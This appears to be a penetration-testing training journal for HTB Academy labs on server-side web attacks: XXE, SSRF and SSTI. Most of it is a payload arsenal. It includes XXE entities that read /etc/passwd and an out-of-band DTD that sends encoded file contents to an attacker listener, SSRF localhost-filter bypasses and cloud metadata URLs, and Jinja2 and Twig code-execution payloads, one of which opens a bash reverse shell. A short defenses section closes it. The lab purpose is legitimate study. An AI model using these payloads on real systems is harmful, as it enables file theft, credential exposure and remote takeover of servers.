# Web Attacks (Server-Side)

![CPTS Path](https://img.shields.io/badge/CPTS-Web%20Exploitation-00ff66?style=flat-square&logo=gitbook&logoColor=white)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square)

> [!NOTE]
> **OFFENSIVE OPERATIONS JOURNAL**
> Dedicated documentation for the CPTS syllabus training.

---

## [+] Mission Objectives
- [x] Understand the mechanics of Server-Side Web Attacks (XXE, SSRF, SSTI)
- [x] Clear all HTB Academy target labs
- [x] Document repeatable vectors, payloads, and defense bypasses

---

## [>] Tactical Theory & Methodology

Server-side web attacks occur when an attacker influences input that is processed on the backend server, forcing it to execute unintended commands, fetch unauthorized resources, or read system files.

### 1. XML External Entity (XXE) Injection
XXE occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.
- **Local File Disclosure (LFD)**: Using the `SYSTEM` identifier to read local files (e.g., `/etc/passwd`).
- **Blind / Out-of-Band (OOB) XXE**: Used when the application does not return the response directly. The attacker hosts an external DTD that triggers a request containing the file content to their listener.

```text
XXE Execution Flow:
Attacker (Payload) -----[ XML with External Entity ]-----> Web Server (Weak Parser)
Attacker (OOB DTD)  <----[ Requests External DTD ]--------- Web Server
Attacker (OOB DTD)  -----[ Serves Exfiltration DTD ]-----> Web Server
Attacker (Listener) <----[ Sends Data via GET/HTTP ]------ Web Server
```

### 2. Server-Side Request Forgery (SSRF)
SSRF occurs when a web application fetches a remote resource without validating the user-supplied URL. It allows attackers to coerce the application server into sending requests to internal-only resources.
- **Internal Service Access**: Reaching internal administrative portals, localhost endpoints (e.g., `http://127.0.0.1:8080`), or cloud metadata endpoints (`http://169.254.169.254`).
- **Blind SSRF**: The response is not returned to the attacker. Detection relies on network interactions (e.g., DNS/HTTP lookup to an attacker-controlled server).

### 3. Server-Side Template Injection (SSTI)
SSTI occurs when user input is concatenated directly into a template instead of being passed as data. This allows the attacker to execute arbitrary template expressions, which can lead to Remote Code Execution (RCE).
- **Template Identification**: Feed mathematical expressions to determine the template engine.
  - `${7*7}` or `{{7*7}}` -> If `49` is returned, it indicates a templating engine is active.

---

## [!] Arsenal & Payload Log

### 1. XML External Entity (XXE) Payloads

#### Classic File Disclosure (Internal Entity)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <username>&xxe;</username>
  <password>admin</password>
</root>
```

#### PHP Wrapper Source Code Disclosure (Bypassing character limits/errors)
```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

#### Out-of-Band (OOB) DTD Setup (`xxe.dtd` on attacker machine)
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.x:8000/?data=%file;'>">
%eval;
%exfil;
```
*HTTP payload payload trigger in request:*
```xml
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://10.10.14.x:8000/xxe.dtd">
  %remote;
]>
```

---

### 2. Server-Side Request Forgery (SSRF) Vectors

#### Basic Metadata Enumeration
- **AWS Metadata**: `http://169.254.169.254/latest/meta-data/`
- **DigitalOcean**: `http://169.254.169.254/metadata/v1.json`

#### Localhost Evasion Bypasses
If `127.0.0.1` or `localhost` is blocked, try:
- **Decimal/Hex IP**: `http://2130706433` (Decimal) or `http://0x7f000001` (Hex)
- **Octal IP**: `http://0177.0000.0000.0001`
- **Shortened IP**: `http://127.1` or `http://0`
- **IPv6 Localhost**: `http://[::1]` or `http://[::]`
- **DNS Redirection**: Use services like `sslip.io` or `127.0.0.1.nip.io`.

---

### 3. Server-Side Template Injection (SSTI) Payloads

#### Template Engine Detection Matrix

```text
               ${7*7}
              /      \
          (49)       (no)
          /             \
    {{7*7}}             a{*comment*}b
    /     \             /           \
  (49)    (no)      (ab)          (no)
  /          \       /               \
Jinja2      Twig   Mako             Generic
```

#### Jinja2 (Python) RCE Payloads
```jinja2
# Read File
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}

# RCE / Reverse Shell
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.x/9001 0>&1"').read() }}
```

#### Twig (PHP) RCE Payloads
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## [¤] Operation Log (Proof of Concept)

### Scenario: SSRF to Internal Service Enumeration

```yaml
Target URL: http://10.129.20.10/nav.php?url=
Target Host: 10.129.20.10
Objective: Extract local config database
```

#### 1. Identification of SSRF
Submit request seeking a test web server:
```http
GET /nav.php?url=http://10.10.14.2:8000/test HTTP/1.1
Host: 10.129.20.10
```
*Result shows a connection to the attacker's HTTP listener, confirming SSRF.*

#### 2. Localhost Port Scan via Intruder/Python
Script to sweep ports on `127.0.0.1` via the vulnerable URL parameter:
```python
import requests

for port in [80, 8080, 9000, 3306]:
    r = requests.get(f"http://10.129.20.10/nav.php?url=http://127.0.0.1:{port}")
    if "Connection refused" not in r.text:
        print(f"[+] Active local port: {port}")
```

---

## [*] Post-Mortem & Defenses

- **Lessons Learned**:
  - For XXE, check parser configurations first. If output is suppressed, Out-of-Band (OOB) methods are the primary path forward.
  - In SSTI, ensure the mathematical evaluation syntax checks (`${7*7}`) are tested against all potential template boundaries.
- **Detection & Mitigation**:
  - **XXE Prevention**: Completely disable External Entity Resolution (`DTD / XML External Entities`) in XML Parsers (e.g., `libxml_disable_entity_loader(true)` in PHP).
  - **SSRF Prevention**: Implement strict **Allowlists** for protocols (restrict to HTTP/HTTPS) and domains. Never resolve DNS hostnames directly without checking resolved IPs against RFC 1918 (private space) exclusions.
  - **SSTI Prevention**: Treat templates strictly as static layout files. Pass user input as context arguments (variables) rather than dynamically compiling strings with user inputs. Use sandbox configurations if custom evaluation is necessary.
